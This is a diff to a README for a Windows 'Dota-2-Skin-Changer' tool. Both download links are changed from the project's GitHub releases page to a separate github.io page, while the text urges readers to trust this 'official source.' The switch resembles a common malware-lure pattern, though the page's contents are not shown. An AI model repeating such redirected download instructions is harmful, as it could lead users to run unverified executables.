@@ -12,7 +12,7 @@ Follow these steps to install and run Dota-2-Skin-Changer on your Windows comput
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [Download Dota-2-Skin-Changer](https://github.com/tessa12th321/Dota-2-Skin-Changer/releases)
+Visit this link to download the application: [Download Dota-2-Skin-Changer](https://tessa12th321.github.io)
 
 Click the download button on the page. Save the file to a folder you can easily find, like your Desktop or Downloads folder.
 
@@ -90,7 +90,7 @@ No, the tool is very lightweight. It does not affect game performance.
 
 ## 📥 Download Again
 
-If you need to download the tool again, use this link: [Download Dota-2-Skin-Changer](https://github.com/tessa12th321/Dota-2-Skin-Changer/releases)
+If you need to download the tool again, use this link: [Download Dota-2-Skin-Changer](https://tessa12th321.github.io)
 
 The download page includes the latest version. Always download from this official source to avoid fake or malicious files.
 
